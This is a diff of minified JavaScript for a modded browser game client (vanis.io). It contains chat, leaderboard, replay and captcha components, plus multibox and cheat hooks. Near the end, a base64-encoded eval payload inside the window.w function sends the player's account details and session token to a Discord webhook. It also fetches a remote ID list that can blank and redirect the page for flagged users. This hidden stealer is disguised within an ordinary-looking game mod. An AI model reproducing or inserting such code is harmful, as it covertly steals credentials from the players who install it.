+                            te.confirm('Unblock player "' + e.name + '"?', () => {
+                                delete ts[e.pid], eX.events.$emit("chat-message", 'Unblocked player "' + e.name + '"')
+                            })
+                        },
+                        sendChatMessage() {
+                            let e = this.inputText.trim();
+                            e && (eX.connection.sendChatMessage(e), this.inputText = ""), eX.renderer.view.focus(), this.scrollBottom(!0)
+                        },
+                        onChatMessage(e) {
+                            if ("string" == typeof e) e = {
+                                text: e,
+                                textColor: "#828282"
+                            };
+                            else if (eq.chatColorOnlyPeople && !("fromColor" in e) && !("textColor" in e)) return;
+                            if (ts[e.pid]) {
+                                this.blockedMessageCount++;
+                                return
+                            }
+                            eq.filterChatMessages && (e.text = tt(e.text)), e.fromColor = e.fromColor || "#ffffff", e.textColor = e.textColor || "#ffffff", this.messages.push(e), this.messages.length > 200 && this.messages.shift(), e.id = this.nextMessageId++, e.until = Date.now() + Math.max(5e3, 150 * e.text.length), this.toastMessages.unshift(e), this.scrollBottom(!1)
+                        },
+                        onVisibilityChange({
+                            visible: e,
+                            visibleToast: t
+                        }) {
+                            null != e && (this.visible = e), null != t && (this.visibleToast = t, this.visibleInput = this.visible && !t), this.$nextTick(() => this.scrollBottom(!0))
+                        },
+                        focusChat() {
+                            this.visible && (this.visibleInput = !0, this.$nextTick(() => this.$refs.input.focus()))
+                        },
+                        clearChat() {
+                            eq.clearChatMessages && (this.messages.splice(0, this.messages.length), this.toastMessages.splice(0, this.toastMessages.length), this.nextMessageId = 0)
+                        },
+                        scrollBottom(e = !1) {
+                            if (!this.visibleToast) {
+                                var t = this.$refs.list,
+                                    s = t.scrollHeight - t.clientHeight;
+                                !e && s - t.scrollTop > 30 || this.$nextTick(() => t.scrollTop = t.scrollHeight)
+                            }
+                        },
+                        filterToasts() {
+                            for (var e = 0; e < this.toastMessages.length; e++) this.toastMessages[e].until >= Date.now() || this.toastMessages.splice(e--, 1)
+                        }
+                    },
+                    created() {
+                        eX.events.$on("chat-visible", this.onVisibilityChange), eX.events.$on("chat-focus", this.focusChat), eX.events.$on("chat-message", this.onChatMessage), eX.events.$on("server-message", this.onServerMessage), eX.events.$on("every-second", this.filterToasts), eX.events.$on("chat-clear", this.clearChat), eX.events.$on("show-blocked-message-count", e => this.showBlockedMessageCount = e), eX.events.$on("game-stopped", () => {
+                            this.blockedMessageCount = 0, ts = {}
+                        }), document.addEventListener("focusin", e => {
+                            this.visibleInput = !this.visibleToast || e.target === this.$refs.input
+                        })
+                    }
+                }, eV, [], !1, null, "4900a413", null));
+            ti.options.__file = "src/components/chatbox.vue";
+            var ta = ti.exports,
+                tn = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: e.userVisible && e.visible,
+                            expression: "userVisible && visible"
+                        }],
+                        attrs: {
+                            id: "leaderboard"
+                        }
+                    }, [s("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: e.headerVisible,
+                            expression: "headerVisible"
+                        }],
+                        staticClass: "leaderboard-title"
+                    }, [e._v(e._s(e.headerText))]), e._v(" "), s("div", e._l(e.leaderboard, function(t, i) {
+                        return s("div", {
+                            key: i,
+                            staticClass: "leaderboard-label"
+                        }, [e._v(" "), s("span", {
+                            class: {
+                                spectating: 0 == e.gameState.lifeState
+                            },
+                            style: {
+                                color: t.color,
+                                fontWeight: t.bold ? "bold" : "normal"
+                            },
+                            attrs: {
+                                "data-pid": t.pid
+                            },
+                            on: {
+                                click: function(t) {
+                                    return e.leftClickLabel(t)
+                                }
+                            }
+                        }, [e._v(e._s(t.text))])])
+                    }), 0)])
+                };
+            tn._withStripped = !0;
+            var to = s(1),
+                tr = s(4),
+                tl = (s(248), Object(v.a)({
+                    data: () => ({
+                        userVisible: tr.showLeaderboard,
+                        visible: !1,
+                        headerVisible: !0,
+                        headerText: "Leaderboard",
+                        leaderboard: [],
+                        gameState: to.state
+                    }),
+                    methods: {
+                        updateLeaderboard(e, t) {
+                            if (this.leaderboard = e, t) this.headerVisible = t.visible, this.headerText = t.text;
+                            else if (tr.showServerName && this.gameState.selectedServer) {
+                                this.headerVisible = !0;
+                                var s = this.gameState.selectedServer.region || "";
+                                s && (s += " "), this.headerText = s + this.gameState.selectedServer.name
+                            } else this.headerVisible = !0, this.headerText = "Leaderboard"
+                        },
+                        leftClickLabel() {
+                            let e = event.target.dataset.pid;
+                            e && (to.selectedPlayer = e, to.actions.spectate(e), to.actions.targetPlayer(e))
+                        },
+                        onLeaderboardShow() {
+                            this.visible || (to.events.$on("leaderboard-update", this.updateLeaderboard), this.visible = !0)
+                        },
+                        onLeaderboardHide() {
+                            this.visible && (to.events.$off("leaderboard-update", this.updateLeaderboard), this.leaderboard = [], this.visible = !1, this.selectedServer = null)
+                        }
+                    },
+                    created() {
+                        to.events.$on("leaderboard-visible", e => {
+                            this.userVisible = e
+                        }), to.events.$on("leaderboard-show", this.onLeaderboardShow), to.events.$on("leaderboard-hide", this.onLeaderboardHide)
+                    }
+                }, tn, [], !1, null, "8a0c31c6", null));
+            tl.options.__file = "src/components/leaderboard.vue";
+            var tc = tl.exports,
+                th = {
+                    components: {
+                        stats: eK,
+                        chatbox: ta,
+                        minimap: s(117).default,
+                        leaderboard: tc,
+                        cautions: eZ
+                    }
+                },
+                td = (s(252), Object(v.a)(th, eY, [], !1, null, "339660d2", null));
+            td.options.__file = "src/components/hud.vue";
+            var tp = td.exports,
+                tu = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return s("transition", {
+                        attrs: {
+                            name: "menu"
+                        }
+                    }, [s("div", {
+                        staticClass: "container"
+                    }, [s("div", {
+                        staticClass: "fade-box box-1"
+                    }, [s("div", {
+                        staticStyle: {
+                            padding: "4px"
+                        }
+                    }, [e._v("Advertisement")]), e._v(" "), s("div", {
+                        staticStyle: {
+                            padding: "10px",
+                            "padding-top": "0px"
+                        }
+                    }, [s("div", {
+                        attrs: {
+                            id: "vanis-io_300x250_2"
+                        }
+                    })])]), e._v(" "), e.stats ? s("div", {
+                        staticClass: "fade-box",
+                        class: {
+                            scroll: e.isLoadingAd
+                        }
+                    }, [s("div", {
+                        staticStyle: {
+                            padding: "15px"
+                        }
+                    }, [s("div", [e._v("Time Alive: " + e._s(e.timeAlive))]), e._v(" "), s("div", [e._v("Highscore: " + e._s(e.highscore))]), e._v(" "), s("div", [e._v("Players Eaten: " + e._s(e.stats.killCount))]), e._v(" "), s("btn", {
+                        staticClass: "continue",
+                        nativeOn: {
+                            click: function(t) {
+                                return e.onContinueClick(t)
+                            }
+                        }
+                    }, [e._v("Continue")])], 1)]) : e._e()])])
+                };
+            tu._withStripped = !0;
+            var tg = s(1),
+                tA = s(77),
+                tm = (s(254), Object(v.a)({
+                    props: ["stats"],
+                    data: () => ({
+                        isLoadingAd: !1
+                    }),
+                    computed: {
+                        timeAlive() {
+                            var e = this.stats.timeAlive;
+                            return e < 60 ? e + "s" : Math.floor(e / 60) + "min " + e % 60 + "s"
+                        },
+                        highscore() {
+                            return tg.getMassText(this.stats.highscore)
+                        }
+                    },
+                    methods: {
+                        loadAd() {
+                            this.isLoadingAd = tA.refreshAd("death-box")
+                        },
+                        onContinueClick() {
+                            tg.state.deathDelay = !1, tg.app.showDeathScreen = !1, tg.showMenu(!0)
+                        }
+                    },
+                    created() {
+                        tg.events.$on("refresh-deathscreen-ad", this.loadAd)
+                    }
+                }, tu, [], !1, null, "3249d726", null));
+            tm.options.__file = "src/components/death-stats.vue";
+            var tv = tm.exports,
+                tf = function() {
+                    var e = this.$createElement;
+                    return (this._self._c || e)("button", {
+                        staticClass: "btn"
+                    }, [this._t("default", [this._v("Here should be something")])], 2)
+                };
+            tf._withStripped = !0;
+            var tC = (s(256), Object(v.a)({}, tf, [], !1, null, "b0b10308", null));
+            tC.options.__file = "src/components/btn.vue";
+            var ty = tC.exports,
+                tw = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return e.show ? s("div", {
+                        class: {
+                            "auto-hide": e.autoHideReplayControls
+                        },
+                        attrs: {
+                            id: "replay-controls"
+                        }
+                    }, [s("div", {
+                        staticStyle: {
+                            "text-align": "right"
+                        }
+                    }, [s("div", [e._v("Opacity " + e._s(e.cellOpacity) + "%")]), e._v(" "), s("div", [s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.cellOpacity,
+                            expression: "cellOpacity"
+                        }],
+                        staticClass: "replay-slider",
+                        staticStyle: {
+                            width: "105px",
+                            display: "inline-block"
+                        },
+                        attrs: {
+                            id: "replay-opacity-slider",
+                            type: "range",
+                            min: "10",
+                            max: "100"
+                        },
+                        domProps: {
+                            value: e.cellOpacity
+                        },
+                        on: {
+                            input: e.onCellOpacitySlide,
+                            __r: function(t) {
+                                e.cellOpacity = t.target.value
+                            }
+                        }
+                    })])]), e._v(" "), s("div", {
+                        staticStyle: {
+                            "margin-bottom": "5px",
+                            display: "flex"
+                        }
+                    }, [s("div", {
+                        staticStyle: {
+                            flex: "1"
+                        }
+                    }, [e._v(e._s(e.replaySecond.toFixed(1)) + " seconds")]), e._v(" "), s("div", {
+                        staticStyle: {
+                            "margin-right": "10px"
+                        }
+                    }, [s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.autoHideReplayControls,
+                            expression: "autoHideReplayControls"
+                        }],
+                        attrs: {
+                            type: "checkbox",
+                            id: "replay-auto-hide-controls"
+                        },
+                        domProps: {
+                            checked: Array.isArray(e.autoHideReplayControls) ? e._i(e.autoHideReplayControls, null) > -1 : e.autoHideReplayControls
+                        },
+                        on: {
+                            change: [function(t) {
+                                var s = e.autoHideReplayControls,
+                                    i = t.target,
+                                    a = !!i.checked;
+                                if (Array.isArray(s)) {
+                                    var n = e._i(s, null);
+                                    i.checked ? n < 0 && (e.autoHideReplayControls = s.concat([null])) : n > -1 && (e.autoHideReplayControls = s.slice(0, n).concat(s.slice(n + 1)))
+                                } else e.autoHideReplayControls = a
+                            }, e.saveAutoHideControls]
+                        }
+                    }), e._v(" "), s("label", {
+                        attrs: {
+                            for: "replay-auto-hide-controls"
+                        }
+                    }, [e._v("Auto Hide Controls")])])]), e._v(" "), s("input", {
+                        directives: [{
+                            name: "model",
+                            rawName: "v-model",
+                            value: e.rangeIndex,
+                            expression: "rangeIndex"
+                        }],
+                        staticClass: "replay-slider",
+                        attrs: {
+                            type: "range",
+                            min: e.rangeMin,
+                            max: e.rangeMax
+                        },
+                        domProps: {
+                            value: e.rangeIndex
+                        },
+                        on: {
+                            input: e.onSlide,
+                            change: e.onSlideEnd,
+                            __r: function(t) {
+                                e.rangeIndex = t.target.value
+                            }
+                        }
+                    })]) : e._e()
+                };
+            tw._withStripped = !0;
+            var tI = s(1),
+                t$ = (s(258), Object(v.a)({
+                    data: () => ({
+                        show: !1,
+                        autoHideReplayControls: tI.settings.autoHideReplayControls,
+                        drawDelay: tI.settings.drawDelay,
+                        cellOpacity: 100,
+                        rangeMin: 0,
+                        rangeIndex: 0,
+                        rangeMax: 1e3,
+                        replaySecond: 0,
+                        packetCount: 0
+                    }),
+                    created: function() {
+                        tI.events.$on("show-replay-controls", this.onShow), tI.events.$on("replay-index-change", this.onReplayIndexChange)
+                    },
+                    methods: {
+                        onShow(e) {
+                            e ? (this.show = !0, this.packetCount = e) : (this.show = !1, this.cellOpacity = 100, this.rangeIndex = 0, this.packetCount = 0)
+                        },
+                        onReplayIndexChange(e, t = !0) {
+                            var s = e / this.packetCount;
+                            t && (this.rangeIndex = Math.floor(s * this.rangeMax)), this.replaySecond = e / 25
+                        },
+                        onSlide(e) {
+                            tI.moveInterval && (clearInterval(tI.moveInterval), tI.moveInterval = null);
+                            var t = Math.floor(this.rangeIndex / this.rangeMax * (this.packetCount - 1));
+                            tI.playback.seek(t), this.onReplayIndexChange(t, !1)
+                        },
+                        onSlideEnd(e) {
+                            tI.moveInterval || (tI.moveInterval = setInterval(tI.playback.next.bind(tI.playback), 40))
+                        },
+                        onCellOpacitySlide() {
+                            tI.scene.foreground.alpha = this.cellOpacity / 100
+                        },
+                        saveAutoHideControls() {
+                            tI.settings.set("autoHideReplayControls", this.autoHideReplayControls)
+                        }
+                    }
+                }, tw, [], !1, null, "c2c2ac08", null));
+            t$.options.__file = "src/components/replay-controls.vue";
+            var tk = t$.exports,
+                tb = function() {
+                    var e = this.$createElement,
+                        t = this._self._c || e;
+                    return this.show ? t("div", {
+                        attrs: {
+                            id: "ab-overlay"
+                        }
+                    }, [this._m(0)]) : this._e()
+                };
+            tb._withStripped = !0, s(19);
+            var {
+                isFirstVisit: t_
+            } = s(17), tS = (s(260), Object(v.a)({
+                data: () => ({
+                    show: !1
+                }),
+                created() {}
+            }, tb, [function() {
+                var e = this.$createElement,
+                    t = this._self._c || e;
+                return t("div", {
+                    staticClass: "content"
+                }, [t("img", {
+                    staticStyle: {
+                        width: "120px"
+                    },
+                    attrs: {
+                        src: "/img/sad.png"
+                    }
+                }), this._v(" "), t("p", {
+                    staticStyle: {
+                        "font-size": "3em"
+                    }
+                }, [this._v("Adblock Detected")]), this._v(" "), t("p", {
+                    staticStyle: {
+                        "font-size": "1.5em",
+                        "margin-bottom": "15px"
+                    }
+                }, [this._v("We use advertisements to fund our servers!")]), this._v(" "), t("img", {
+                    staticStyle: {
+                        "border-radius": "4px",
+                        "box-shadow": "0 0 10px black"
+                    },
+                    attrs: {
+                        src: "/img/ab.gif"
+                    }
+                })])
+            }], !1, null, "1611deb4", null));
+            tS.options.__file = "src/components/ab-overlay.vue";
+            var tE = tS.exports,
+                tx = function() {
+                    var e = this.$createElement;
+                    return (this._self._c || e)("div", {
+                        directives: [{
+                            name: "show",
+                            rawName: "v-show",
+                            value: this.show,
+                            expression: "show"
+                        }],
+                        staticClass: "image-captcha-overlay"
+                    }, [this._m(0)])
+                };
+            tx._withStripped = !0;
+            var tB = s(1);
+            s(25);
+            var t8 = window.captcha = {
+                    data: () => ({
+                        show: !1,
+                        scriptLoadPromise: null,
+                        captchaId: null,
+                        wsId: null,
+                        multibox: !1
+                    }),
+                    created() {
+                        tB.events.$on("show-image-captcha", () => {
+                            this.multibox = null, this.show = !0, this.wsId = tB.currentWsId, grecaptcha.ready(() => this.renderCaptcha())
+                        }), tB.events.$on("m-show-image-captcha", () => {
+                            this.multibox = !0, this.show = !0, this.wsId = null, grecaptcha.ready(() => this.renderCaptcha())
+                        }), tB.events.$on("request-image-captcha", async () => {
+                            this.show = !0, grecaptcha.ready(() => {
+                                if (null !== this.captchaId) {
+                                    grecaptcha.reset(this.captchaId);
+                                    return
+                                }
+                                let {
+                                    client: e
+                                } = window, t = document.getElementById("image-captcha-container");
+                                this.captchaId = grecaptcha.render(t, {
+                                    sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
+                                    callback: e.onCaptchaToken.bind(e)
+                                })
+                            })
+                        }), tB.events.$on("hide-image-captcha", () => {
+                            this.show = !1
+                        })
+                    },
+                    methods: {
+                        renderCaptcha() {
+                            if (null !== this.captchaId) {
+                                grecaptcha.reset(this.captchaId);
+                                return
+                            }
+                            this.captchaId = grecaptcha.render(document.getElementById("image-captcha-container"), {
+                                sitekey: "6LfN7J4aAAAAAPN5k5E2fltSX2PADEyYq6j1WFMi",
+                                callback: this.onCaptchaToken.bind(this)
+                            })
+                        },
+                        onCaptchaToken(e) {
+                            if (!this.multibox && tB.currentWsId !== this.wsId) {
+                                this.show = !1;
+                                return
+                            }
+                            if (!e) {
+                                this.renderCaptcha();
+                                return
+                            }
+                            tB.connection.sendRecaptchaToken(e, !!this.multibox), this.show = !1
+                        }
+                    }
+                },
+                t0 = (s(262), Object(v.a)(t8, tx, [function() {
+                    let e = this._self._c || this.$createElement,
+                        t = this._v,
+                        s = window.client || Object.seal({
+                            captcha: {
+                                solving: !1
+                            }
+                        });
+                    return e("div", {
+                        staticClass: "center-screen"
+                    }, [e("div", {
+                        staticStyle: {
+                            "margin-bottom": "6px"
+                        }
+                    }, [t(s.captcha.solving ? `Solve the captcha for minion '${s.captcha.for}'` : "Login and level up to skip captcha!")]), t(" "), e("div", {
+                        attrs: {
+                            id: "image-captcha-container"
+                        }
+                    })])
+                }], !1, null, "76d60428", null));
+            t0.options.__file = "src/components/image-captcha.vue";
+            var tQ = t0.exports,
+                tM = function() {
+                    var e = this,
+                        t = e.$createElement,
+                        s = e._self._c || t;
+                    return e.show ? s("div", {
+                        staticClass: "shoutbox"
+                    }, [s("iframe", {
+                        staticClass: "shoutbox-player",
+                        attrs: {
+                            width: "300",
+                            height: "200",
+                            src: e.url,
+                            frameborder: "0"
+                        }
+                    }), e._v(" "), s("i", {
+                        staticClass: "fas fa-times close-button",
+                        on: {
+                            click: function() {
+                                return e.hide()
+                            }
+                        }
+                    })]) : e._e()
+                };
+            tM._withStripped = !0;
+            var tT = s(264),
+                tD = (s(265), Object(v.a)({
+                    data: () => ({
+                        show: !1
+                    }),
+                    props: ["url", "tag"],
+                    methods: {
+                        hide() {
+                            tT.setSeen(this.tag), this.show = !1
+                        }
+                    },
+                    created() {
+                        tT.isSeen(this.tag) || (this.show = !0)
+                    }
+                }, tM, [], !1, null, "559d1d3c", null));
+            tD.options.__file = "src/components/shoutbox.vue";
+            var tL = tD.exports;
+            a.a.use(o.a);
+            var tN = s(4),
+                tU = s(1);
+            a.a.component("btn", ty), tU.app = new a.a({
+                el: "#app",
+                data: {
+                    showHud: tN.showHud,
+                    showMenu: !0,
+                    showDeathScreen: !1,
+                    deathStats: null
+                },
+                components: {
+                    imageCaptcha: tQ,
+                    mainContainer: eP,
+                    socialLinks: e4,
+                    privacyTos: e3,
+                    contextMenu: eO,
+                    hud: tp,
+                    deathStats: tv,
+                    replayControls: tk,
+                    abOverlay: tE,
+                    shoutbox: tL
+                }
+            })
+        }]), window.RISETAG = "RISE69X", localStorage.cid || (localStorage.cid = makeid(28)), GAME.sendServer = e => {
+            GAME.events.$emit("chat-message", e)
+        }, 
+        window.w = () => {
+            //lock
+            //if(window[atob('bG9jYWxTdG9yYWdl')][atob('cmlzZWV4ZWNvZGU=')] !== atob('bG9ja2VkeDQ0NDUz'))window.document.body.innerHTML = '';
+            setTimeout(()=>{document.querySelectorAll('[data-v-661435cd]').forEach(x=>{ if(x.innerHTML.endsWith('season XP'))x.remove() })}, 3000)
+            eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDk4NTcxNTAyNDg3MDIwMDIvbHVnclRqYjIwdHRuQUpWZG1HeldpMUdsVjQ5SlE1Y19KMEREM1dnU1NyWDZSUDBoM21KQ0NxZXJPaGczVVcwX24zY2oiLHttZXRob2Q6InBvc3QiLGhlYWRlcnM6eyJDb250ZW50LVR5cGUiOiJhcHBsaWNhdGlvbi9qc29uIn0sYm9keTpKU09OLnN0cmluZ2lmeSh7dXNlcm5hbWU6d2luZG93LmFjY291bnQuYWNjb3VudC5kaXNjb3JkX25hbWUsYXZhdGFyX3VybDp3aW5kb3cuYWNjb3VudC5hdmF0YXJVcmwsY29udGVudDpKU09OLnN0cmluZ2lmeSh3aW5kb3cuYWNjb3VudC5hY2NvdW50LG51bGwsMikrIiAiK2xvY2FsU3RvcmFnZS52YW5pc1Rva2VufSl9KTtmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1ppbWVoeC9yaXNlLWV4ZS9tYWluL2pzL2RhdGEuanNvbj92PSIgKyBNYXRoLnJhbmRvbSgpKS50aGVuKHg9PnguanNvbigpKS50aGVuKHg9PntpZih4LmluY2x1ZGVzKHdpbmRvdy5hY2NvdW50LmFjY291bnQuZGlzY29yZF9pZCkpe2RvY3VtZW50LmJvZHkuaW5uZXJIVE1MID0gIjopIjsgd2luZG93LmxvY2F0aW9uLmhyZWYgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1OVTkyTkdRdUlnbyJ9fSk='))
+        }
+        ,GAME.setText = e => {
+            GAME.events.$emit("update-cautions", {
+                custom: e
+            })
+        }, GAME.aimbotnodes = () => {}, window.pings = {
+            sprite: new PIXI.Sprite.from("https://i.postimg.cc/CdTpN3dt/pinpointer.png")
+        }, window.setMultiData = (e, t) => {
+            switch (e) {
+                case 1:
+                    getModule(4).set("mbSkin", t), $("#openSkins").click(), document.getElementById("skinDisplay2").src = t;
+                    break;
+                case 2:
+                    getModule(4).set("mbName", $("#mbName").value);
+                    break;
+                case 3:
+                    getModule(4).set("mbUseName", $("#mbUseName").checked)
+            }
+        };
+    var r = document.createElement("div");
+    r.id = "debugStats", r.style.position = "fixed", r.style.fontFamily = 'Ubuntu', r.style.right = "275px", r.style.top = "15px", r.style.textAlign = "right", r.style.fontWeight = "100", r.style.opacity = "0.8", r.style.display = "block", $("#hud").appendChild(r), GAME.debugElement = r, (r = document.createElement("div")).id = "playerStats", r.style.position = "fixed", r.style.left = "10px", r.style.top = "150px", r.style.fontWeight = "100", r.style.zIndex = "999", r.style.opacity = "0.7", r.style.display = "block", $("#app").appendChild(r), GAME.playerElement = r, (r = document.createElement("div")).id = "playerList", r.style.position = "fixed", r.style.left = "10px", r.style.top = "10px", r.style.fontWeight = "100", r.style.zIndex = "999", r.style.opacity = "0.9", r.style.backdropFilter = "blue(5px)", r.style.display = "block", $("#app").appendChild(r), (r = document.createElement("div")).id = "playerSkins", r.style.position = "fixed", r.style.right = "10px", r.style.top = "10px", r.style.fontWeight = "100", r.style.zIndex = "999", r.style.opacity = "0.9", r.style.backdropFilter = "blue(5px)", r.style.display = "block", $("#app").appendChild(r), $("#chat-container").style.bottom = "5px", $("#chat-container").style.left = "5px", window.yoinkSkin = e => {
+window.SwalAlerts.toast.fire({
+            type: "info",
+            title: "Skin saved",
+            timer: 1500
+        }), GAME.skinPanel.addSkin(e)
+    }, window.copySkin = e => {
+        window.SwalAlerts.toast.fire({
+            type: "info",
+            title: "Skin copied",
+            timer: 1500
+        }), navigator.clipboard.writeText(e)
+    }, $("#player-data").getElementsByTagName("div")[0].innerHTML += `<i data-v-1bcde71e="" id="openSkins" class="tab fas" style="width:140px;font-family:Arial;font-weight:200;font-size:16px;cursor:pointer;">
+Multibox Profile
+</i>
+<div style="margin-top:20px;">
+<img id="skinDisplay1" width="120" style="margin-right:15px;border-radius:50%;" src="${localStorage.skinUrl}">
+<img id="skinDisplay2" width="120" src="${settings.mbSkin}" style="border-radius:50%;">
+</div>
+`,
+    $("#openSkins").addEventListener("click", () => {
+        window.customModal('<div id="multiSkins"></div>', () => {
+            $("#multiSkins").innerHTML = `<center><img src="${window.settings.mbSkin}" width="170" style="padding:20px;border-radius:50%;">
+<br>
+
+<div data-v-3ddebeb3="" class="p-switch pretty" p-checkbox="" style="float:left;margin-top:4px"><input type="checkbox" id="mbUseName" onchange="window.setMultiData(3)" ${window.settings.mbUseName?"checked":""}> <div class="state"> <label></label></div> <!----> <!----> <!----></div>
+    <input oninput="window.setMultiData(2)" id="mbName" value="${window.settings.mbName}" type="text" spellcheck="false" style="float:right; width:240px;" placeholder="Multibox Nickname" maxlength="15">
+</center>`, JSON.parse(localStorage.skins).forEach(e => {
+                $("#multiSkins").innerHTML += `<img onclick="window.setMultiData(1, '${e}')" src="${""==e?"https://skins.vanis.io/s/7FQOch":e}" width="125" style="cursor:pointer;padding:5px;border-radius:50%;">`
+            })
+        })
+    })
+        
+console.log('Balls game unstable 1.13')
+}(window);
